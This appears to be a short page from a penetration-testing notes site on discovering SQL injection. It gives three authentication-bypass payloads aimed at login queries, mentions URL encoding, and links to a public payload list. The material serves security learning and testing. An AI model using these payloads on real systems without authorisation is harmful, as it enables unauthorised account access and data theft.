# SQL Injection Discovery



## SQL Injection Discovery

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<mark style="color:red;">**Note:**</mark> In some cases, we may have to use the URL encoded version of the payload. An example of this is when we put our payload directly in the URL 'i.e. HTTP GET request'.



**Examples:**

```sql
admin' or '1'='1
```

```sql
' or 1=1 in (SELECT password FROM users) -- //
```

```sql
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```



You can find a comprehensive list of SQLi auth bypass payloads in [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass), each of which works on a certain type of SQL queries.

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass" %}



\
